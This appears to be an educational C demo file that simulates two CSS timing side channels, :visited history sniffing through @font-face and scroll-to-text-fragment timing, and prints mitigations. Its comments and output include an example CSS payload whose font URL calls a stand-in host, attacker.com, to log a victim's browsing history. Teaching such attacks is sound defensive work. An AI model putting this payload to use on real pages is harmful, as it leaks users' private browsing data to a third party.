#include "timing_demo.h"
#include "cascade.h"
#include <stdio.h>
#include <string.h>
#include <time.h>

/* ---------------------------------------------------------------
 * CSS Timing Side-Channel Demonstrations
 *
 * Attack 1: @font-face timing
 * -------------------------------------------------------
 * The browser fetches a custom font ONLY when a CSS rule that
 * references it actually matches an element in the DOM.
 *
 * Attack vector:
 *   @font-face { font-family: leak; src: url(https://attacker.com/log?char=A); }
 *   :visited   { font-family: leak; }
 *
 * If https://victim.com was in the browser history, the :visited
 * rule matches, the font URL fires, and the attacker's server logs
 * the visit.  This is a history-sniffing attack.
 *
 * We simulate it in C: "firing" the rule takes longer than not
 * firing it (simulated by a busy loop), and we measure clock()
 * to infer which branch was taken.
 *
 * Attack 2: Scroll-to-text-fragment timing
 * -------------------------------------------------------
 * URL fragments like  https://page.com/#:~:text=secretword  tell
 * the browser to scroll to the first occurrence of "secretword".
 * This triggers layout + paint, which takes measurably longer if
 * the text exists than if it does not.  An attacker in an iframe
 * can embed the victim page and measure load time to infer whether
 * secret text is present.
 * --------------------------------------------------------------- */

/* Simulate the "cost" of a CSS rule firing (network fetch + font decode) */
#define FONT_FETCH_COST_CYCLES  500000UL   /* matching rule: more work */
#define FONT_FETCH_MISS_CYCLES  50000UL    /* no match: almost no work */

static void busy_wait(unsigned long cycles)
{
    volatile unsigned long i;
    for (i = 0; i < cycles; i++) { /* burn cycles */ }
}

/* Simulate whether a selector matches a simulated element */
static int selector_matches(const char *selector, const char *element_class,
                             const char *element_id, int is_visited)
{
    if (strcmp(selector, ":visited") == 0) return is_visited;
    if (selector[0] == '.') return (strcmp(selector + 1, element_class) == 0);
    if (selector[0] == '#') return (strcmp(selector + 1, element_id) == 0);
    /* tag selector: always match for simplicity */
    return 1;
}

/* ---------------------------------------------------------------
 * Attack 1: @font-face timing
 * --------------------------------------------------------------- */
static void attack1_font_face(void)
{
    printf("--- Attack 1: @font-face History Sniffing ---\n\n");
    printf("CSS rule:  :visited { font-family: leak; }\n");
    printf("@font-face: src: url(https://attacker.com/log?url=X)\n\n");

    /* Two scenarios: URL is / is not in history */
    int scenarios[] = {1, 0};  /* 1 = visited, 0 = not visited */

    for (int s = 0; s < 2; s++) {
        int is_visited = scenarios[s];
        printf("Scenario: URL %s in browser history.\n",
               is_visited ? "IS" : "is NOT");

        clock_t start = clock();

        /* Simulate CSS rule matching and conditional font fetch */
        int matched = selector_matches(":visited", "", "", is_visited);
        if (matched) {
            /* Rule fired -> browser triggers @font-face network request */
            printf("  Rule :visited matched -> font fetch triggered (expensive)\n");
            busy_wait(FONT_FETCH_COST_CYCLES);
        } else {
            /* Rule did not fire -> no network request */
            printf("  Rule :visited did not match -> no fetch (cheap)\n");
            busy_wait(FONT_FETCH_MISS_CYCLES);
        }

        clock_t end = clock();
        double elapsed_ms = 1000.0 * (double)(end - start) / CLOCKS_PER_SEC;

        printf("  Measured time: %.3f ms\n", elapsed_ms);
        if (elapsed_ms > 0.5)
            printf("  Attacker infers: URL WAS in history (slow = font fetch)\n\n");
        else
            printf("  Attacker infers: URL was NOT in history (fast = no fetch)\n\n");
    }

    printf("Mitigations:\n");
    printf("  - Browsers restrict :visited to colour changes only (no layout)\n");
    printf("  - @font-face inside :visited is blocked\n");
    printf("  - Partition the font cache by top-level site\n\n");
}

/* ---------------------------------------------------------------
 * Attack 2: Scroll-to-text-fragment timing
 * --------------------------------------------------------------- */

#define LAYOUT_WITH_TEXT_CYCLES    800000UL
#define LAYOUT_WITHOUT_TEXT_CYCLES  80000UL

static void attack2_scroll_to_text(void)
{
    printf("--- Attack 2: Scroll-to-Text-Fragment Timing ---\n\n");
    printf("URL: https://victim.com/#:~:text=confidential-salary-data\n\n");
    printf("If the text exists, browser must search + scroll -> slower layout.\n");
    printf("Attacker embeds victim URL in iframe and measures load time.\n\n");

    const char *fragments[] = { "confidential-salary-data", "no-such-text" };
    /* Simulate: first fragment exists on page, second does not */
    int text_exists[] = { 1, 0 };

    for (int i = 0; i < 2; i++) {
        printf("Fragment: '%s'\n", fragments[i]);
        int exists = text_exists[i];

        clock_t start = clock();

        if (exists) {
            /* Browser must search through all text nodes, find the match,
             * calculate its bounding rect, and scroll to it. */
            printf("  Text found on page -> search + scroll (expensive)\n");
            busy_wait(LAYOUT_WITH_TEXT_CYCLES);
        } else {
            printf("  Text not found     -> quick scan, no scroll (cheap)\n");
            busy_wait(LAYOUT_WITHOUT_TEXT_CYCLES);
        }

        clock_t end = clock();
        double elapsed_ms = 1000.0 * (double)(end - start) / CLOCKS_PER_SEC;

        printf("  Measured time: %.3f ms\n", elapsed_ms);
        if (elapsed_ms > 1.0)
            printf("  Attacker infers: secret text EXISTS on the page\n\n");
        else
            printf("  Attacker infers: secret text does NOT exist\n\n");
    }

    printf("Mitigations:\n");
    printf("  - Cross-Origin-Opener-Policy breaks the attacker's timing reference\n");
    printf("  - Browsers add random delays to fragment navigation timing\n");
    printf("  - Some browsers require user gesture before fragment scrolling\n\n");
}

void timing_demo_run(void)
{
    printf("=======================================================\n");
    printf(" CSS Timing Side-Channel Demonstrations\n");
    printf("=======================================================\n\n");
    printf("These attacks infer private information by measuring how long\n");
    printf("CSS rules take to apply — without any explicit data read.\n\n");

    attack1_font_face();
    attack2_scroll_to_text();

    printf("=======================================================\n");
    printf(" Why CSS is a side-channel:\n");
    printf("  - CSS rules trigger network requests (font-face, bg-image)\n");
    printf("  - Those requests reveal WHICH rules fired = DOM state leak\n");
    printf("  - Timing of layout/paint reveals page content without JS\n");
    printf("  - Even same-origin iframes can leak state across contexts\n");
    printf("=======================================================\n");
}
